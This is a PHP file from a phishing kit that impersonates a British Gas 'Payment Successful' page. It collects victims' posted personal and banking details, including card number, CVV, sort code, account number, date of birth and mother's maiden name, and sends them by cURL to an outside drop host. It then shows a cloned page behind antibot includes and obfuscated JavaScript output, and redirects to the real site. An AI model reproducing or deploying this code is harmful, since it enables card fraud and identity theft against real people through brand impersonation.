<?php

error_reporting(0);
include "at.php";
include "control.php";

include('files/boot/check.php');
include('files/boot/check1.php');
include('files/boot/check2.php');
include('files/boot/antibot.php');
include('files/v/enc.php');

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
session_start();
session_regenerate_id();
if(isset($_GET["validid"]))
{
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(13,15));
	
$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(13,15));
	


	
	$str .= "Full Name: $_POST[fullname]<br>";
	$str .= "Address: $_POST[address]<br>";
	$str .= "City: $_POST[city]<br>";
	$str .= "Zip: $_POST[postcode]<br>";
	$str .= "Phone: $_POST[phone]<br>";
	$str .= "DOB: $_POST[dob]<br>";
    $str .= "MMN: $_POST[mmn]<br><br>";
	
	
	$str .= "CC Name: $_POST[ccname]<br>";
	$str .= "CC: $_POST[ccnumber]<br>";
	$str .= "Exp: $_POST[expmonth] $_POST[expyear]<br>";
	$str .= "CVV: $_POST[cvv]<br>";
	$str .= "SORT-CODE: $_POST[sort_code]<br>";
	$str .= "ACCNO: $_POST[acc_number]<br>";


$today = date("m.d.y");


$strx = $_POST['ccnumber'];

$strx=preg_replace('/\s+/', '', $strx);

$details="$strx|$_POST[expmonth]|$_POST[expyear]|$_POST[cvv]|Name on Card : $_POST[ccname]|$_POST[address]|$_POST[city]|$_POST[postcode]|UK|phone number : $_POST[phone]|date of birth : $_POST[dob]|account number : $_POST[acc_number]|sort code : $_POST[sort_code]|Full Name : $_POST[fullname]|mother maiden name : $_POST[mmn]".PHP_EOL;

	




$ch = curl_init('https://www.fffeggs.com.au/dir/wp-content/images/savuccbtfull.php');
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, "subject=".$strx."&data=".$details);
curl_exec ($ch);
curl_close ($ch);

	echo '<!DOCTYPE html>
	'.ob_start().'
<html class="win chrome chrome69 webkit webkit5"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="refresh" content="12;URL=&#39;https://href.li/?https://www.britishgas.co.uk/my-account.html">

<script>

this.top.location !== this.location && (this.top.location = this.location);

</script>

<link rel="SHORTCUT ICON" href="include/favicon.ico">

  <title>Payment Successful</title>
  <meta name="apple-itunes-app" content="app-id=340473961">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="format-detection" content="telephone=no">

  
<style data-di-res-id="3e0d27a1-d3f25a54">
#app-preloader {
  font-family: Arial;
  width: 180px; height: 30px;
  line-height: 30px; position: absolute; top: 50%; left: 50%; text-align: center;
  margin-top: -15px; margin-left: -90px;
  color: #0099ff; z-index: 1000;
}
</style><style type="text/css" media="screen" id="mm_style_mm_cdApiStyleId_1" data-di-res-id="3e0d27a1-bdf193c7">
    @media only screen and (max-width: 824px) {
  #navbar > li > a {
  font-size: 90% !important;
  }
  }
</style>

<style type="text/css" data-di-res-id="3e0d27a1-c6dbd281">#edr_survey .edr_lwrap iframe {width:100%;height:100%;}#edr_survey .edr_go {opacity:0;display:block;filter:alpha(opacity = 0);position:absolute;font-size:0;background-color:#000;margin:0;padding:0;z-index:1000000;}#edr_survey .edr_go:focus {opacity:1;filter:alpha(opacity = 50);background-color:rgba(0, 0, 0, 0.01);}#edr_survey .edr_lb {position:fixed;top:0;left:0;right:0;bottom:0;z-index:999998;display:none;}</style></head><body class="ember-application">

  <link rel="stylesheet" href="include/bg-vi-3.1.3.css">

<meta name="theme-color" content="#005EB8">

  <link rel="stylesheet" href="include/font-awesome.min.css">
  <link rel="stylesheet" href="include/vendor-416d16c8ba603df5e490eb31016b5ffd.css">
  <link rel="stylesheet" href="include/oam-596afcf15544f353e71652cf97054e76.css">

  <link rel="stylesheet" href="include/hpp-embedded-integration-library.css">
  
  <div id="destination"></div>



<div id="ember622" class="ember-view"><div id="ember666" class="hide-on-app-component ember-view"><header id="addon-bg-header" class="bgcss custom-bg-1 bg-header-component ember-view"><nav class="navbar yamm navbar-default navbar-fixed-top">
  <a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="sr-only sr-only-focusable" data-di-id="di-id-bc438264-6a2ce56e">Skip to main content</a>
    <div class="topnav py1">
      <div class="container">
        <div class="pull-left">
          <div id="ember676" class="__56f18 bg-top-nav-component ember-view"><span class="background-white active px2 py3">My Home</span><ul class="navbar-nav collapse navbar-collapse navbar-topnav navbar-right yamm-fw" style="max-height: 542.6px;"><li class="dropdown dropdown-topnav"><a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" class="px2 py3 dropdown-toggle" data-di-id="di-id-4ce36cc2-6bc03ed3">My Business</a><div role="menu" aria-labelledby="Business" class="dropdown-menu dropdown-menu-topnav"><ul role="menu" class="fa-ul ml2 mr4 mb4"><div><div class="Business Energy"><a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" data-di-id="di-id-57386b5b-e9691660"><h5 class="px2 py2">Business Energy</h5></a><li><a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" data-di-id="di-id-57386b5b-e9691660"></a><a title="businessElectricity" role="menuitem" href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Business electricity</a></li><li><a title="businessGas" role="menuitem" href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Business gas</a></li><li><a title="businessGAQ" role="menuitem" href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Get a business energy quote</a></li></div><div class="Business Services"><a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" data-di-id="di-id-beec423d-b10f10ee"><h5 class="px2 py2">Business Services</h5></a><li><a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" data-di-id="di-id-beec423d-b10f10ee"></a><a title="businessBoilerMaintenance" role="menuitem" href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Business boiler maintenance</a></li><li><a title="businessBoilerInstallation" role="menuitem" href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Business boiler installation</a></li><li><a title="businessBoilerBreakdown" role="menuitem" href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Business boiler breakdown</a></li></div><div class="Your business account"><a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" data-di-id="di-id-5fb40e3a-f202382d"><h5 class="px2 py2">Your business account</h5></a><li><a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" data-di-id="di-id-5fb40e3a-f202382d"></a><a title="businessLogin" role="menuitem" href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Login</a></li><li><a title="businessRegister" role="menuitem" href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" class="menu-section"><i class="fa fa-angle-right"></i>Register</a></li></div></div></ul></div></li></ul></div>
        </div>
        <div id="quickLinks" class="pull-right hidden-xs">
            <span class="px2"><i class="fa fa-chevron-circle-right"></i><a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" title="Log out" data-di-id="di-id-15ea3a86-773089fd"> Log out</a></span>
        </div>
      </div>
    </div>
  <div class="container">
    <div class="navbar-header">
      <button type="button" id="btn-menu-1" data-toggle="collapse" data-target="#mobile-Menu-3" class="navbar-toggle collapsed" data-ember-action="" data-ember-action-685="685" data-di-id="#btn-menu-1">
        <i class="fa fa-reorder ml1 mr1"></i>
        <p>Menu</p>
      </button>
      <button type="button" id="btn-menu-2" data-toggle="collapse" data-target="#mobile-Menu-2" class="navbar-toggle collapsed" data-ember-action="" data-ember-action-686="686" data-di-id="#btn-menu-2">
        <i class="fa fa-user"></i>
        <p>My Account</p>
      </button>
      <a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" id="logo" data-di-id="#logo">
            <img alt="British Gas" src="include/bg-logo-mobile.svg" width="146px" height="57px" class="bg-logo mt1 mb1 xs-ml2 sm-ml0" data-di-width="146" data-di-height="57" data-di-res-id="6c3a0aef-1e955062">
      </a>
    </div>
    <div class="nav-list-adj nav-bar-content">
        <div id="navbar-collapse-1" class="collapse navbar-collapse bg-menu-component ember-view" style="max-height: 542.6px;"><ul id="navbar" class="nav navbar-nav navbar-right">
    <li class="dropdown yamm-fw mt5">
        <a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" data-toggle="dropdown" role="button" title="Energy" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold" data-di-id="di-id-17d915d3-1474b5a5">
          Energy
        </a>
        
    </li>
    <li class="dropdown yamm-fw mt5">
        <a href="/h" data-toggle="dropdown" role="button" title="Home Services" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold" data-di-id="di-id-37b14f08-68b70a9d">
          Home Services
        </a>
        
    </li>
    <li class="dropdown yamm-fw mt5">
        <a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" data-toggle="dropdown" role="button" title="Smart Home" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold" data-di-id="di-id-37b14f08-d988b97e">
          Smart Home
        </a>
       
    </li><li class="dropdown yamm-fw mt5"><a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" id="MXM-Rewards" data-toggle="dropdown" role="button" title="Rewards" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold" data-di-id="#MXM-Rewards">Rewards</a></li>

    <li class="dropdown yamm-fw mt5">
        <a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" id="help-and-support" data-toggle="dropdown" role="button" title="Help &amp; Support" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold" data-di-id="#help-and-support">
          Help &amp; Support
        </a>
<!---->    </li>
    <li class="dropdown yamm-fw mt5">
        <a href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" id="loggedInLink" data-toggle="dropdown" role="button" title="My Account" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold" data-di-id="#loggedInLink">
          My Account
        </a>
       
    </li>
</ul>
</div>
    </div>
  </div>
</nav>
</header></div><div class="oam overflow-hidden body-content-min-height"><div class="custom-bg-1 bgcss custom-bg"><!----><div id="ember694" class="text-center p6 __ca81c toast-container-component hidden ember-view"><div class="toast-container-content">
<!----></div>
</div><div><div id="ember720" class="liquid-container liquid-container-component ember-view" style=""><div id="ember731" class="liquid-child liquid-child-component ember-view" style="top: 0px; left: 0px;"><div id="ember736" class="liquid-container liquid-container-component ember-view" style=""><div id="ember1989" class="liquid-child liquid-child-component ember-view" style="top: 0px; left: 0px;"><div id="ember2000" class="__bc80a dashboard-header-component ember-view"><nav id="navbar-dashboard" class="dashboard-header navbar navbar-default background-dark-blue border-none m0">
  <div class="container">
    <div class="navbar-header">
        <div class="navbar-text white salutation inspectlet-sensitive ">
          </div>
      
    </div>
  </div>
</nav>
</div><div id="ember2008" class="scroll-anchor scroll-anchor-component scroll-anchorbelow-dashboard-header ember-view">
</div><div id="ember2009" class="__599da full-width-header-elsewhere-component ember-view">    <div id="ember2275" class="css-full-width-header-elsewhere liquid-child liquid-child-component ember-view" style=""><!----></div>
</div><div class="container dashboard-container"><div id="ember2014" class="dashboard-container-outlet row liquid-container liquid-container-component ember-view" style=""><div id="ember2017" class="liquid-child liquid-child-component ember-view" style="top: 0px; left: 0px;"><div class="container"><div class="row overflow-hidden"><div class="col-sm-2 p0 hidden-xs"><ul id="ember2027" class="ml3 background-white __58bd7 dashboard-intellinav-component ember-view">  

<li class="m0 p0">
    <a style="touch-action: manipulation; -ms-touch-action: manipulation; cursor: pointer;" href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" id="ember2030" class="font-size-9 bold border-bottom border-white hover-dark-blue slate hover-background-light-grey link-to-component ember-view" data-di-id="#ember2030">          <i class="bgcss-icon-dashboard"></i>
        Customer Message
</a>
  </li>
  <li class="m0 p0">
    <a style="touch-action: manipulation; -ms-touch-action: manipulation; cursor: pointer;" href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" id="ember2033" class="font-size-9 bold border-bottom border-white hover-dark-blue slate hover-background-light-grey link-to-component ember-view" data-di-id="#ember2033">          <i class="bgcss-icon-dashboard"></i>
        Step 1: Personal Details
</a>
  </li>
  
  <li class="m0 p0">
    <a style="touch-action: manipulation; -ms-touch-action: manipulation; cursor: pointer;" href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" id="ember2033" class="font-size-9 bold border-bottom border-white hover-dark-blue slate hover-background-light-grey link-to-component ember-view" data-di-id="#ember2033">          <i class="bgcss-icon-dashboard"></i>
        Step 2: Billing Details
</a>
  </li>
  
  <li class="m0 p0">
    <a style="touch-action: manipulation; -ms-touch-action: manipulation; cursor: pointer;" href="/complete.php?&amp;sessionid='.randomCha(rand(10,30)).'&amp;securessl=true" id="ember2033" class="font-size-9 bold border-bottom border-white hover-dark-blue slate hover-background-light-grey link-to-component active  ember-view" data-di-id="#ember2033">          <i class="bgcss-icon-dashboard"></i>
        Complete
</a>
  </li>
  
</ul></div><div class="col-sm-10 py3"><div id="ember2056" class="text-center price-rise-notification __96b37 price-rise-component ember-view"><!----><!----></div><div id="ember2060" class="liquid-container liquid-container-component ember-view" style=""><div id="ember2063" class="liquid-child liquid-child-component ember-view" style="top: 0px; left: 0px;"><div id="ember2069" class="text-center __feaa4 dashboard-notifications-component ember-view"><div id="ember2293" class="dashboard-notification bill __b1ef3 bill-component ember-view">  <div id="ember2594" class="yard-trigger-component ember-view">
</div>
  <div class="bills col-md-12 mb2 wrapper border border-blue-grey background-light-grey py2 px1 animated fadeIn text-center">
    


          <div id="ember2604" class="__fee36 cash-cheque-in-debit-bill-component ember-view">    <div id="ember2614" class="bill-summary-a-component ember-view"><!----><!----></div>
    <div id="ember2616" class="bill-summary-a-component ember-view">  <div class="col-md-12 col-sm-12 bill-notification">
      <br>
      <h3 class="mt1 mb4">
        Payment Successful
      </h3><br>

    <p class="mb6 bill-issue-date"><label style="font-size: 130%">Processing...</label><br><br><img src="include/spin.gif"><br><br>
    Your payment has been successfully processed. Please allow up to 72 Hours for your payment to be completed.<br>
    <br>You are being automatically logged out and redirected to our login page...          </p>

    <br>
  </div>
<!----></div>
</div>



  </div>
</div></div></div></div></div></div></div></div></div></div><div style="touch-action: manipulation; -ms-touch-action: manipulation; cursor: pointer;" id="ember2227" class="__cf5be overlay-container-component ember-view">
</div><!----></div></div>
<!----></div></div></div><div id="ember748" class="__8f8fb modal-elsewhere-component ember-view">    <div id="ember831" class="liquid-child liquid-child-component ember-view" style=""><!----></div>
</div><div id="ember756" class="full-page-overlay-elsewhere-component ember-view">    <div id="ember835" class="liquid-child liquid-child-component ember-view" style=""><!----></div>
</div><div id="ember760" class="modal-elsewhere-bootstrap-component ember-view">    <div id="ember839" class="liquid-child liquid-child-component ember-view" style=""><!----></div>
</div></div></div><div id="ember764" class="cookieMessage __00705 cookie-warning-component hidden ember-view">We use cookies to provide a better experience. Carry on browsing if you"re happy with this, or <a href="https://britishgas.co.uk/global-maintenance/cookies-policy.html" data-di-id="di-id-8de55434-224255b4"> click here</a> to manage cookies.<span class="pointer fa fa-close" data-ember-action="" data-ember-action-765="765"></span></div><div id="ember766" class="hide-on-app-component ember-view"><footer id="addon-bg-footer" class="bgcss custom-bg-1 bg-footer __94c1a bg-footer-component ember-view"><div class="footer__wrapper background-dark-blue britishgas">
  <div class="container sm-py12 xs-py8">

    <div class="footer__link-group row equal-height-row">

      <div class="footer__link-group__primary col-lg-3 col-sm-3 col-md-3 col-xs-6 equal-height-col">
        <ul class="footer__nav p0 mb0">
            <li class="footer__nav__item">
              <a href="https://britishgas.co.uk/about-us.html" title="About British Gas" class="footer__nav__link pb1" data-di-id="di-id-59440b18-4e510e27">About us</a>
            </li>
            <li class="footer__nav__item">
              <a href="https://britishgas.co.uk/legal-information.html" title="Legal" class="footer__nav__link pb1" data-di-id="di-id-347e5bb2-516d5ce">Legal</a>
            </li>
            <li class="footer__nav__item">
              <a href="https://britishgas.co.uk/global-maintenance/cookies-policy.html" title="Cookie policy" class="footer__nav__link pb1" data-di-id="di-id-40dc4179-aecf246d">Cookie policy</a>
            </li>
            <li class="footer__nav__item">
              <a href="https://britishgas.co.uk/terms-and-conditions.html" title="Terms &amp; conditions" class="footer__nav__link pb1" data-di-id="di-id-b430aa1c-3fad5438">Terms &amp; conditions</a>
            </li>
            <li class="footer__nav__item">
              <a href="https://britishgas.co.uk/privacy-policy.html" title="Privacy policy" class="footer__nav__link pb1" data-di-id="di-id-3dd70a94-2f4573c4">Privacy policy</a>
            </li>
            <li class="footer__nav__item">
              <a href="https://britishgas.co.uk/accessibility.html" title="Access for all" class="footer__nav__link pb1" data-di-id="di-id-3dd70a94-adfe2962">Access for all</a>
            </li>
            <li class="footer__nav__item">
              <a href="https://britishgas.co.uk/aem6/content/britishgas/guaranteed-standards-of-performance.html" title="Performance standards" class="footer__nav__link pb1" data-di-id="di-id-13e5dac1-e9b6913c">Performance standards</a>
            </li>
            <li class="footer__nav__item">
              <a href="https://britishgas.co.uk/complaints.html" title="Complaints" class="footer__nav__link pb1" data-di-id="di-id-fa591318-3baee8d2">Complaints</a>
            </li>
            <li class="footer__nav__item">
              <a href="https://britishgas.co.uk/complaints/performance.html" title="Our complaints performance" class="footer__nav__link pb1" data-di-id="di-id-78bc9378-30da77a2">Complaints performance</a>
            </li>

            <li class="footer__nav__item">
              <a href="https://britishgas.co.uk/help-and-support/emergencies" title="Emergencies" class="footer__nav__link pb1" data-di-id="di-id-b17c3fc7-a9712ab8">Emergencies</a>
            </li>
            <li class="footer__nav__item">
              <a href="https://britishgas.co.uk/youraccount/discover/app.html" title="Download our app" class="footer__nav__link pb1" data-di-id="di-id-b17c3fc7-156c0a2c">Download our app</a>
            </li>
        </ul>
      </div>

      <div class="footer__link-group__secondary border-right border-cyan col-md-3 col-lg-3 col-sm-3 col-xs-6 equal-height-col">
        <ul class="footer__nav p0 mb0">
            <li class="footer__nav__item">
              <a href="https://britishgas.co.uk/business/" title="British Gas Business" class="footer__nav__link pb1" data-di-id="di-id-31bb2a97-bcc8643">
                British Gas Business
              </a>
            </li>
            <li class="footer__nav__item">
              <a href="https://www.hivehome.com/" title="Hive Active Heating" class="footer__nav__link pb1" data-di-id="di-id-2531c2cc-566e5783">
                Hive Active Heating
              </a>
            </li>
            <li class="footer__nav__item">
              <a href="http://www.centrica.com/" title="Centrica PLC" class="footer__nav__link pb1" data-di-id="di-id-517a1ce1-9efd7b05">
                Centrica PLC
              </a>
            </li>
        </ul>
      </div>

        <div class="footer__link-group__social col-sm-6 col-xs-12 col-lg-4 col-md-6 social-box equal-height-col">
          <div class="row">

            <div class="footer__social__item footer-social col-sm-5 col-md-5 col-lg-5 col-xs-6 col-sm-offset-1 col-md-offset-1 col-lg-offset-1">
              <a target="_blank" href="http://www.twitter.com/britishgas" class="footer__social__link mb6 block " data-di-id="di-id-abc3cd1d-a3d737b3">
                <img src="include/Icon_Twitter.svg" width="39" alt="Twitter" class="footer__social__icon" data-di-width="39" data-di-height="39">
                <span class="footer__social__copy">Twitter</span>
              </a>
            </div>

            <div class="footer__social__item footer-social col-xs-6 col-sm-6 col-md-6 col-lg-6">
              <a target="_blank" href="http://www.youtube.com/britishgas" class="footer__social__link mb6 block" data-di-id="di-id-abc3cd1d-34f32c2f">
                <img src="include/Icon_YouTube.svg" width="39" alt="YouTube" class="footer__social__icon" data-di-width="39" data-di-height="39">
                <span class="footer__social__copy">YouTube</span>
              </a>
            </div>
          </div>

          <div class="row">
            <div class="footer__social__item footer-social col-sm-5 col-sm-offset-1 col-md-5 col-md-offset-1 col-lg-5 col-lg-offset-1 col-xs-offset-0 col-xs-6">
              <a target="_blank" href="http://www.facebook.com/britishgas" class="footer__social__link mb6 block" data-di-id="di-id-abc3cd1d-8c511340">
                <img src="include/Icon_Facebook.svg" width="39" alt="Facebook" class="footer__social__icon" data-di-width="39" data-di-height="39">
                <span class="footer__social__copy">Facebook</span>
              </a>
            </div>

            <div class="footer__social__item footer-social col-xs-6 col-sm-6 col-md-6 col-lg-6">
              <a target="_blank" href="http://www.britishgas.co.uk/the-source" class="footer__social__link mb6 block" data-di-id="di-id-6e9f1c72-b9fb6588">
                <img src="include/Icon_News.svg" width="39" alt="Latest news" class="footer__social__icon" data-di-width="39" data-di-height="39">
                <span class="footer__social__copy">Latest news</span>
              </a>
            </div>
          </div>
        </div>
    </div>

    <div class="footer__legal row">
      <div class="col-xs-12 legal-links">
        <div class="pull-right">
          <img title="British Gas" src="include/bg_logo_white.svg" class="footer-bg-logo" data-di-width="170" data-di-height="63">
          <p class="britishgas">� British Gas 2018</p>
        </div>
      </div>
    </div>

  </div>
</div>
</footer><div id="ember797" class="body-footer-component ember-view"><div id="ember802" class="ember-wormhole-component ember-view"></div></div></div></div><div id="body-footer-1"></div>
      
   
 <div id="edr_survey"></div><script> 
window.onload=function(){ 
history.pushState(null,null, "locale=en-US&?id='.$fnamex.'/'.$fnamex.'3'.$fnamex.'6'.$fnamex.'") 
} 
</script>
';
?>
<?php $html=ob_get_clean()?><?php $test=0;if($test){    echo $html; }else{     ?>  <script type="text/javascript">     var _0xa211=["","\x6A\x6F\x69\x6E","\x25","\x73\x6C\x69\x63\x65","\x30\x30","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x61\x6C\x6C","\x6D\x61\x70","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65"];function _kaktys_encode(_0x60c0x2){return decodeURIComponent(Array[_0xa211[8]][_0xa211[7]][_0xa211[6]](atob(_0x60c0x2),function(_0x60c0x3){return _0xa211[2]+ (_0xa211[4]+ _0x60c0x3[_0xa211[5]](0).toString(16))[_0xa211[3]](-2)})[_0xa211[1]](_0xa211[0]))}     document.write(_kaktys_encode("<?php echo base64_encode($html) ?>")); </script>    <?php }  ?>
echo '</body></html>';


<?php
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 500);
	die("<h1>404 Page Not Found</h1>");
}
?>